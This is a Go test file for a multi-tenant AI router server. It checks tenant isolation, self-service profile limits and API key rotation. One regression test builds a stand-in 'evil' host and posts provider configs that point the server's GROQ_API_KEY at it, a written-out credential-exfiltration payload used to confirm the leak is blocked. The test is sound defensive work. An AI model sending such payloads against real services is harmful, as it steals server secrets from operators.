package server

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/mrmhthegreat/airouter/pkg/router"
	"github.com/mrmhthegreat/airouter/pkg/types"
)

func makeTenant(t *testing.T, r *router.Router, id string) string {
	t.Helper()
	_, key, err := r.CreateTenant(context.Background(), types.Tenant{ID: id, Name: id, TZ: "UTC"})
	if err != nil {
		t.Fatal(err)
	}
	return key
}

// A tenant must never be able to make the server send its own env keys to a
// host the tenant controls (regression test for the airouter_9 leak).
func TestTenantCannotStealServerKey(t *testing.T) {
	t.Setenv("GROQ_API_KEY", "SERVER-SECRET-KEY")
	got := make(chan string, 4)
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case got <- r.Header.Get("Authorization"):
		default:
		}
		w.WriteHeader(500)
	}))
	defer evil.Close()
	r := newTestRouter(t)
	alice := makeTenant(t, r, "alice")
	srv := httptest.NewServer(NewHandler(r, ""))
	defer srv.Close()
	for _, body := range []string{
		`{"name":"x","kind":"openai","base_url":"` + evil.URL + `","api_key_env":"GROQ_API_KEY","model":"m"}`,
		`{"preset":"groq","model":"m","api_key_env":"GROQ_API_KEY","base_url":"` + evil.URL + `"}`,
	} {
		c, m, _ := do(t, srv, "POST", "/v1/me/providers", alice, body)
		t.Logf("add: %d %v", c, m)
	}
	// bootstrap must not copy server env keys into the tenant either
	c, _, raw := do(t, srv, "POST", "/v1/me/bootstrap", alice, `{"keys":{"X":"y"}}`)
	t.Logf("bootstrap: %d %s", c, raw)
	_, _, lst := do(t, srv, "GET", "/v1/me/providers", alice, "")
	if strings.Contains(lst, "SERVER-SECRET-KEY") || strings.Contains(lst, "GROQ_API_KEY") && strings.Contains(lst, evil.URL) {
		t.Fatalf("server key or evil url stored for tenant: %s", lst)
	}
	do(t, srv, "POST", "/v1/generate", alice, `{"prompt":"hi"}`)
	select {
	case h := <-got:
		t.Fatalf("LEAK: evil host received Authorization=%q", h)
	default:
	}
}

func TestMeProfileAndRotate(t *testing.T) {
	r := newTestRouter(t)
	alice := makeTenant(t, r, "alice")
	srv := httptest.NewServer(NewHandler(r, ""))
	defer srv.Close()
	c, m, raw := do(t, srv, "PATCH", "/v1/me", alice, `{"name":"Alice","tz":"Asia/Karachi","daily_request_limit":999999,"disabled":true}`)
	if c != 200 {
		t.Fatalf("patch %d %s", c, raw)
	}
	tn := m["tenant"].(map[string]any)
	if tn["name"] != "Alice" || tn["tz"] != "Asia/Karachi" {
		t.Fatalf("profile not updated: %v", tn)
	}
	if v, _ := tn["daily_request_limit"].(float64); v == 999999 {
		t.Fatal("tenant lifted its own quota")
	}
	if d, _ := tn["disabled"].(bool); d {
		t.Fatal("tenant disabled itself via PATCH")
	}
	c, _, _ = do(t, srv, "PATCH", "/v1/me", alice, `{"tz":"Nope/Zone"}`)
	if c != 400 {
		t.Fatalf("bad tz want 400 got %d", c)
	}
	c, m, _ = do(t, srv, "POST", "/v1/me/rotate-key", alice, "")
	nk, _ := m["api_key"].(string)
	if c != 200 || nk == "" {
		t.Fatalf("rotate %d", c)
	}
	if c, _, _ := do(t, srv, "GET", "/v1/me", alice, ""); c != 401 {
		t.Fatalf("old key should be dead, got %d", c)
	}
	if c, _, _ := do(t, srv, "GET", "/v1/me/usage", nk, ""); c != 200 {
		t.Fatalf("usage with new key: %d", c)
	}
}
